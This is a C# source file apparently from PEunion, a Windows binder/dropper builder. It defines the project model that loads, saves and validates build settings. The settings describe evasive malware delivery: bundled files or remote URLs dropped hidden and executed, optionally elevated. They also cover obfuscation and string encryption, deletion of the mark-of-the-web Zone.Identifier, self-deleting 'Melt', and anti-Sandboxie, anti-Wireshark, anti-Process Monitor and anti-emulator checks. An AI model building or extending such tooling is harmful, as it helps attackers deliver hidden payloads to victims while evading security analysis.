using BytecodeApi;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Xml.Linq;

namespace PEunion
{
	public class Project : ObservableObject
	{
		public string SaveLocation
		{
			get => Get(() => SaveLocation);
			set
			{
				Set(() => SaveLocation, value);
				RaisePropertyChanged(() => ProjectName);
			}
		}
		public bool IsDirty
		{
			get => Get(() => IsDirty);
			set
			{
				Set(() => IsDirty, value);
				WindowMain.Singleton.Title = ProjectName + (value ? " *" : null) + " - PEunion";
				WindowMain.Singleton.txtProjectTabIsDirty.SetVisibility(value);

				if (IconPath == null)
				{
					WindowMain.Singleton.ctrlBrowseIcon.Text = null;
					WindowMain.Singleton.ctrlBrowseIcon.IconImageSource = null;
				}
				else
				{
					WindowMain.Singleton.ctrlBrowseIcon.Text = Path.GetFileName(IconPath);
					WindowMain.Singleton.ctrlBrowseIcon.IconImageSource = File.Exists(IconPath) ? FileEx.GetIcon(IconPath, true).ToBitmapSource() : Utility.GetImageResource("ImageMissingIcon");
				}
				WindowMain.Singleton.ctrlBrowseIcon.IsResetButtonEnabled = IconPath != null;

				ValidateBuild();
			}
		}
		public BuildPlatform Platform
		{
			get => Get(() => Platform);
			set
			{
				Set(() => Platform, value);
				IsDirty = true;
			}
		}
		public BuildManifest Manifest
		{
			get => Get(() => Manifest);
			set
			{
				Set(() => Manifest, value);
				IsDirty = true;
			}
		}
		public string IconPath
		{
			get => Get(() => IconPath);
			set
			{
				Set(() => IconPath, value);
				IsDirty = true;
			}
		}
		public string AssemblyTitle
		{
			get => Get(() => AssemblyTitle);
			set
			{
				Set(() => AssemblyTitle, value);
				IsDirty = true;
			}
		}
		public string AssemblyProduct
		{
			get => Get(() => AssemblyProduct);
			set
			{
				Set(() => AssemblyProduct, value);
				IsDirty = true;
			}
		}
		public string AssemblyCopyright
		{
			get => Get(() => AssemblyCopyright);
			set
			{
				Set(() => AssemblyCopyright, value);
				IsDirty = true;
			}
		}
		public string AssemblyVersion
		{
			get => Get(() => AssemblyVersion);
			set
			{
				Set(() => AssemblyVersion, value);
				IsDirty = true;
			}
		}
		public BuildObfuscationType Obfuscation
		{
			get => Get(() => Obfuscation);
			set
			{
				Set(() => Obfuscation, value);
				RaisePropertyChanged(() => ObfuscationExample);
				IsDirty = true;
			}
		}
		public bool StringEncryption
		{
			get => Get(() => StringEncryption);
			set
			{
				Set(() => StringEncryption, value);
				IsDirty = true;
			}
		}
		public bool StringLiteralEncryption
		{
			get => Get(() => StringLiteralEncryption);
			set
			{
				Set(() => StringLiteralEncryption, value);
				IsDirty = true;
			}
		}
		public bool DeleteZoneID
		{
			get => Get(() => DeleteZoneID);
			set
			{
				Set(() => DeleteZoneID, value);
				IsDirty = true;
			}
		}
		public bool Melt
		{
			get => Get(() => Melt);
			set
			{
				Set(() => Melt, value);
				IsDirty = true;
			}
		}
		public ObservableCollection<ProjectItem> Items
		{
			get => Get(() => Items);
			set
			{
				if (Get(() => Items) != null) Get(() => Items).CollectionChanged -= Items_CollectionChanged;
				Set(() => Items, value);
				if (value != null) value.CollectionChanged += Items_CollectionChanged;
				RaisePropertyChanged(() => ProjectName);
				IsDirty = true;
			}
		}
		public ValidationError[] ValidationErrors
		{
			get => Get(() => ValidationErrors);
			set => Set(() => ValidationErrors, value);
		}
		public int ValidationErrorCount
		{
			get => Get(() => ValidationErrorCount);
			set => Set(() => ValidationErrorCount, value);
		}
		public int ValidationWarningCount
		{
			get => Get(() => ValidationWarningCount);
			set => Set(() => ValidationWarningCount, value);
		}
		public int ValidationMessageCount
		{
			get => Get(() => ValidationMessageCount);
			set => Set(() => ValidationMessageCount, value);
		}

		public string ObfuscationExample => Lookups.ObfuscationExamples[Obfuscation];
		public IEnumerable<ProjectFile> FileItems => Items.OfType<ProjectFile>();
		public IEnumerable<ProjectUrl> UrlItems => Items.OfType<ProjectUrl>();
		public IEnumerable<ProjectMessageBox> MessageBoxItems => Items.OfType<ProjectMessageBox>();
		public string ProjectName => SaveLocation == null ? FileItems.Any() ? Path.GetFileNameWithoutExtension(FileItems.First().Name) : "New Project" : Path.GetFileNameWithoutExtension(SaveLocation);
		public event EventHandler ValidationErrorsChanged;

		public Project()
		{
			Items = new ObservableCollection<ProjectItem>();
			Platform = BuildPlatform.AnyCPU;
			Manifest = BuildManifest.AsInvoker;
			Obfuscation = BuildObfuscationType.Special;
			StringEncryption = true;
			StringLiteralEncryption = true;
			DeleteZoneID = true;
			IsDirty = false;
		}

		public static Project Load(string path)
		{
			string projectDirectory = Path.GetDirectoryName(path);
			Project project = new Project();

			XElement xml = XDocument.Load(path).Root;

			XElement outputBinaryElement = xml.Element("Build").Element("OutputBinary");
			XElement assemblyElement = outputBinaryElement.Element("Assembly");
			XElement iconElement = outputBinaryElement.Element("Icon");
			XElement assemblyInfoElement = outputBinaryElement.Element("AssemblyInfo");
			XElement codeGenerationElement = xml.Element("Build").Element("CodeGeneration");
			XElement startupElement = xml.Element("Build").Element("Startup");

			project.Platform = (BuildPlatform)Convert.ToInt32(assemblyElement.Attribute("Platform").Value);
			project.Manifest = (BuildManifest)Convert.ToInt32(assemblyElement.Attribute("Manifest").Value);
			project.IconPath = Utility.MakePathAbsolute(iconElement.Attribute("Path").Value.ToNullIfEmpty(), projectDirectory);
			project.AssemblyTitle = assemblyInfoElement.Attribute("Title").Value;
			project.AssemblyProduct = assemblyInfoElement.Attribute("Product").Value;
			project.AssemblyCopyright = assemblyInfoElement.Attribute("Copyright").Value;
			project.AssemblyVersion = assemblyInfoElement.Attribute("Version").Value;

			project.Obfuscation = (BuildObfuscationType)Convert.ToInt32(codeGenerationElement.Attribute("Obfuscation").Value);
			project.StringEncryption = codeGenerationElement.Attribute("StringEncryption").Value == "1";
			project.StringLiteralEncryption = codeGenerationElement.Attribute("StringLiteralEncryption").Value == "1";

			project.DeleteZoneID = startupElement.Attribute("DeleteZoneID").Value == "1";
			project.Melt = startupElement.Attribute("Melt").Value == "1";

			project.Items = xml
				.Element("Items")
				.Elements()
				.Select(item =>
				{
					if (item.Name == "File")
					{
						return new ProjectFile(project, Utility.MakePathAbsolute(item.Attribute("Path").Value, projectDirectory))
						{
							Name = item.Element("Dropping").Attribute("Name").Value,
							Compress = item.Element("Modification").Attribute("Compress").Value == "1",
							Encrypt = item.Element("Modification").Attribute("Encrypt").Value == "1",
							Hidden = item.Element("Modification").Attribute("Hidden").Value == "1",
							DropLocation = Convert.ToInt32(item.Element("Dropping").Attribute("DropLocation").Value),
							DropAction = Convert.ToInt32(item.Element("Execution").Attribute("DropAction").Value),
							Runas = item.Element("Execution").Attribute("Runas").Value == "1",
							CommandLine = item.Element("Execution").Attribute("CommandLine").Value,
							AntiSandboxie = item.Element("Antis").Attribute("Sandboxie").Value == "1",
							AntiWireshark = item.Element("Antis").Attribute("Wireshark").Value == "1",
							AntiProcessMonitor = item.Element("Antis").Attribute("ProcessMonitor").Value == "1",
							AntiEmulator = item.Element("Antis").Attribute("Emulator").Value == "1"
						} as ProjectItem;
					}
					else if (item.Name == "Url")
					{
						return new ProjectUrl(project)
						{
							Url = item.Attribute("Url").Value,
							Name = item.Element("Dropping").Attribute("Name").Value,
							Hidden = item.Element("Modification").Attribute("Hidden").Value == "1",
							DropLocation = Convert.ToInt32(item.Element("Dropping").Attribute("DropLocation").Value),
							DropAction = Convert.ToInt32(item.Element("Execution").Attribute("DropAction").Value),
							Runas = item.Element("Execution").Attribute("Runas").Value == "1",
							CommandLine = item.Element("Execution").Attribute("CommandLine").Value,
							AntiSandboxie = item.Element("Antis").Attribute("Sandboxie").Value == "1",
							AntiWireshark = item.Element("Antis").Attribute("Wireshark").Value == "1",
							AntiProcessMonitor = item.Element("Antis").Attribute("ProcessMonitor").Value == "1",
							AntiEmulator = item.Element("Antis").Attribute("Emulator").Value == "1"
						};
					}
					else if (item.Name == "MessageBox")
					{
						return new ProjectMessageBox(project)
						{
							Title = item.Attribute("Title").Value,
							Text = item.Attribute("Text").Value,
							Buttons = (MessageBoxButtons)Convert.ToInt32(item.Attribute("Buttons").Value),
							Icon = (MessageBoxIcon)Convert.ToInt32(item.Attribute("Icon").Value)
						};
					}
					else
					{
						throw new InvalidOperationException();
					}
				})
				.ToObservableCollection();

			project.SaveLocation = path;
			project.IsDirty = false;
			return project;
		}
		public void Save()
		{
			string projectDirectory = Path.GetDirectoryName(SaveLocation);

			new XDocument
			(
				new XElement
				(
					"PEunionProject",
					new XElement
					(
						"Build",
						new XElement
						(
							"OutputBinary",
							new XElement
							(
								"Assembly",
								new XAttribute("Platform", (int)Platform),
								new XAttribute("Manifest", (int)Manifest)
							),
							new XElement
							(
								"Icon",
								new XAttribute("Path", Utility.MakePathRelative(IconPath ?? "", projectDirectory))
							),
							new XElement
							(
								"AssemblyInfo",
								new XAttribute("Title", AssemblyTitle ?? ""),
								new XAttribute("Product", AssemblyProduct ?? ""),
								new XAttribute("Copyright", AssemblyCopyright ?? ""),
								new XAttribute("Version", AssemblyVersion ?? "")
							)
						),
						new XElement
						(
							"CodeGeneration",
							new XAttribute("Obfuscation", (int)Obfuscation),
							new XAttribute("StringEncryption", StringEncryption ? 1 : 0),
							new XAttribute("StringLiteralEncryption", StringLiteralEncryption ? 1 : 0)
						),
						new XElement
						(
							"Startup",
							new XAttribute("DeleteZoneID", DeleteZoneID ? 1 : 0),
							new XAttribute("Melt", Melt ? 1 : 0)
						)
					),
					new XElement
					(
						"Items",
						Items
							.Select(item =>
							{
								if (item is ProjectFile file)
								{
									return new XElement
									(
										"File",
										new XAttribute("Path", Utility.MakePathRelative(file.FullName, projectDirectory)),
										new XElement
										(
											"Modification",
											new XAttribute("Compress", file.Compress ? 1 : 0),
											new XAttribute("Encrypt", file.Encrypt ? 1 : 0),
											new XAttribute("Hidden", file.Hidden ? 1 : 0)
										),
										new XElement
										(
											"Dropping",
											new XAttribute("Name", file.Name ?? ""),
											new XAttribute("DropLocation", file.DropLocation)
										),
										new XElement
										(
											"Execution",
											new XAttribute("DropAction", file.DropAction),
											new XAttribute("Runas", file.Runas ? 1 : 0),
											new XAttribute("CommandLine", file.CommandLine ?? "")
										),
										new XElement
										(
											"Antis",
											new XAttribute("Sandboxie", file.AntiSandboxie ? 1 : 0),
											new XAttribute("Wireshark", file.AntiWireshark ? 1 : 0),
											new XAttribute("ProcessMonitor", file.AntiProcessMonitor ? 1 : 0),
											new XAttribute("Emulator", file.AntiEmulator ? 1 : 0)
										)
									);
								}
								else if (item is ProjectUrl url)
								{
									return new XElement
									(
										"Url",
										new XAttribute("Url", url.Url ?? ""),
										new XElement
										(
											"Modification",
											new XAttribute("Hidden", url.Hidden ? 1 : 0)
										),
										new XElement
										(
											"Dropping",
											new XAttribute("Name", url.Name ?? ""),
											new XAttribute("DropLocation", url.DropLocation)
										),
										new XElement
										(
											"Execution",
											new XAttribute("DropAction", url.DropAction),
											new XAttribute("Runas", url.Runas ? 1 : 0),
											new XAttribute("CommandLine", url.CommandLine ?? "")
										),
										new XElement
										(
											"Antis",
											new XAttribute("Sandboxie", url.AntiSandboxie ? 1 : 0),
											new XAttribute("Wireshark", url.AntiWireshark ? 1 : 0),
											new XAttribute("ProcessMonitor", url.AntiProcessMonitor ? 1 : 0),
											new XAttribute("Emulator", url.AntiEmulator ? 1 : 0)
										)
									);
								}
								else if (item is ProjectMessageBox messageBox)
								{
									return new XElement
									(
										"MessageBox",
										new XAttribute("Title", messageBox.Title ?? ""),
										new XAttribute("Text", messageBox.Text ?? ""),
										new XAttribute("Buttons", (int)messageBox.Buttons),
										new XAttribute("Icon", (int)messageBox.Icon)
									);
								}
								else
								{
									throw new InvalidOperationException();
								}
							})
							.ToArray()
					)
				)
			).SaveFormatted(SaveLocation);

			IsDirty = false;
		}
		public ValidationError[] ValidateBuild()
		{
			List<ValidationError> errors = new List<ValidationError>();

			if (Manifest == BuildManifest.None && (!AssemblyTitle.IsNullOrEmpty() || !AssemblyProduct.IsNullOrEmpty() || !AssemblyCopyright.IsNullOrEmpty() || AssemblyVersion != null && !AssemblyVersion.EqualsAny("", "0.0.0.0")))
			{
				errors.Add(ValidationError.CreateWarning(null, "Assembly Information will be ignored when building without manifest"));
			}
			if (!IconPath.IsNullOrEmpty() && !File.Exists(IconPath))
			{
				errors.Add(ValidationError.CreateError(null, "Icon file '" + IconPath + "' not found"));
			}
			if (DeleteZoneID && Melt)
			{
				errors.Add(ValidationError.CreateMessage(null, "Delete ZoneID has no effect when Melt is enabled"));
			}
			if (MessageBoxItems.Any() && Manifest == BuildManifest.None)
			{
				errors.Add(ValidationError.CreateMessage(null, "No style is applied to Message Boxes, because there is no manifest"));
			}

			if (Items.Count == 0)
			{
				errors.Add(ValidationError.CreateError(null, "The project does not have any items"));
			}
			else
			{
				string[] unintendedFileExtensions = new[] { "peu", "ico", "lnk" };

				foreach (ProjectFile file in FileItems)
				{
					if (!File.Exists(file.FullName))
					{
						errors.Add(ValidationError.CreateError(file.SourceFileName, "'" + file.FullName + "' not found"));
					}
					else if (new FileInfo(file.FullName).Length > int.MaxValue)
					{
						errors.Add(ValidationError.CreateError(file.SourceFileName, "Only files up to 2 GB are supported"));
					}
					else if (new FileInfo(file.FullName).Length > 1024 * 1024 * 100)
					{
						errors.Add(ValidationError.CreateWarning(file.SourceFileName, "Files larger than 100 MB increase build time and require a lot of memory when extracting"));
					}

					if (file.Name.IsNullOrWhiteSpace())
					{
						errors.Add(ValidationError.CreateError(file.SourceFileName, "'" + file.SourceFileName + "' must specify a filename"));
					}
					else if (!Validate.FileName(file.Name))
					{
						errors.Add(ValidationError.CreateError(file.SourceFileName, "'" + file.Name.Trim() + "' is not a valid filename"));
					}
					else
					{
						string originalExtension = Path.GetExtension(file.FullName).TrimStart('.');
						string newExtension = Path.GetExtension(file.Name).TrimStart('.');
						if (newExtension == "")
						{
							errors.Add(ValidationError.CreateWarning(file.SourceFileName, "'" + file.Name.Trim() + "' has no extension (suggested: " + originalExtension + ")"));
						}
						else if (newExtension.CompareTo(originalExtension, SpecialStringComparison.IgnoreCase) != 0)
						{
							errors.Add(ValidationError.CreateWarning(file.SourceFileName, "'" + file.Name.Trim() + "' has a different extension than the original file (" + originalExtension + ")"));
						}

						if (Path.GetExtension(file.Name).TrimStart('.').ToLower().EqualsAny(unintendedFileExtensions))
						{
							errors.Add(ValidationError.CreateWarning(file.SourceFileName, "File extension '" + Path.GetExtension(file.Name) + "' - Possibly unintended file"));
						}
					}

					if (FileItems.TakeWhile(other => other != file).Any(other => other.Name.CompareTo(file.Name, SpecialStringComparison.IgnoreCase) == 0 && other.DropLocation == file.DropLocation) ||
						Items.TakeWhile(other => other != file).OfType<ProjectUrl>().Any(other => other.Name.CompareTo(file.Name, SpecialStringComparison.IgnoreCase) == 0 && other.DropLocation == file.DropLocation))
					{
						errors.Add(ValidationError.CreateError(file.SourceFileName, "File name '" + file.Name + "' conflicts with other file dropped in the same location"));
					}
					else if (FileItems.TakeWhile(other => other != file).Any(other => other.FullName.CompareTo(file.FullName, SpecialStringComparison.IgnoreCase) == 0))
					{
						errors.Add(ValidationError.CreateMessage(file.SourceFileName, "Identical file '" + file.SourceFileName + "' added a second time"));
					}
				}

				foreach (ProjectUrl url in UrlItems)
				{
					string source = url.Url?.Trim() ?? "URL";

					if (url.Url.IsNullOrWhiteSpace())
					{
						errors.Add(ValidationError.CreateError(source, "Must specify a URL"));
					}
					else if (!Validate.Uri(url.Url))
					{
						errors.Add(ValidationError.CreateError(source, "'" + url.Url + "' is not a valid URL"));
					}

					if (url.Name.IsNullOrWhiteSpace())
					{
						errors.Add(ValidationError.CreateError(source, "Must specify a filename"));
					}
					else if (!Validate.FileName(url.Name))
					{
						errors.Add(ValidationError.CreateError(source, "'" + url.Name.Trim() + "' is not a valid filename"));
					}
					else
					{
						if (Path.GetExtension(url.Name).TrimStart('.') == "")
						{
							errors.Add(ValidationError.CreateWarning(source, "'" + url.Name.Trim() + "' has no extension"));
						}
						if (Path.GetExtension(url.Name).TrimStart('.').ToLower().EqualsAny(unintendedFileExtensions))
						{
							errors.Add(ValidationError.CreateWarning(source, "File extension '" + Path.GetExtension(url.Name) + "' - Possibly unintended file"));
						}
					}

					if (UrlItems.TakeWhile(other => other != url).Any(other => other.Name.CompareTo(url.Name, SpecialStringComparison.IgnoreCase) == 0 && other.DropLocation == url.DropLocation) ||
						Items.TakeWhile(other => other != url).OfType<ProjectFile>().Any(other => other.Name.CompareTo(url.Name, SpecialStringComparison.IgnoreCase) == 0 && other.DropLocation == url.DropLocation))
					{
						errors.Add(ValidationError.CreateError(source, "File name '" + url.Name + "' conflicts with other file dropped in the same location"));
					}
					else if (UrlItems.TakeWhile(other => other != url).Any(other => other.Url == url.Url))
					{
						errors.Add(ValidationError.CreateMessage(source, "Identical URL '" + url.Name + "' added a second time"));
					}
				}

				foreach (ProjectMessageBox messageBox in MessageBoxItems)
				{
					if (messageBox.Title.IsNullOrWhiteSpace() && messageBox.Text.IsNullOrWhiteSpace())
					{
						errors.Add(ValidationError.CreateMessage(null, "Message Box is empty (no text)"));
					}
				}
			}

			ValidationErrors = errors.ToArray();
			ValidationErrorCount = errors.Count(error => error.Type == ValidationErrorType.Error);
			ValidationWarningCount = errors.Count(error => error.Type == ValidationErrorType.Warning);
			ValidationMessageCount = errors.Count(error => error.Type == ValidationErrorType.Message);

			ValidationErrorsChanged?.Invoke(this, EventArgs.Empty);
			return errors.ToArray();
		}

		private void Items_CollectionChanged(object sender, NotifyCollectionChangedEventArgs e)
		{
			RaisePropertyChanged(() => ProjectName);
		}
	}
}